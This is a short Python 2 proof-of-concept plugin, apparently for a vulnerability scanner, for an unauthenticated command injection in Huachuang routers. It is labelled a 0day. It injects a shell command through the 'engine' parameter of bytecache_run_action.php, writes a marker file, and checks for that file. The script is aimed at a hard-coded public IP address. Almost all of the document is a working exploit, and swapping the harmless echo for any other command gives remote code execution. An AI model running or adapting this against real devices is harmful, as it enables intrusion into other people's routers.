#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 华创路由器命令执行0day
refer: 0day
description:
    命令注入...
    看在我半夜还在审计代码的份上多给点rank吧
POC:
    http://foobar/acc/debug/bytecache_run_action.php?action=1&engine=test'|echo testvul>bug.txt||'a
'''

import urlparse


def assign(service, arg):
    if service == 'huachuang_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = arg + 'acc/debug/bytecache_run_action.php?action=1&engine=test%27|echo%20testvul>bug.txt||%27a'
    code, head, res, err, _ = curl.curl2(payload)
    if code == 200:
        code, head, res, err, _ = curl.curl2(arg + 'acc/debug/bug.txt')
        if code == 200 and 'testvul' in res:
            security_hole('命令执行: ' + payload)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('huachuang_router','http://118.26.68.2/')[1])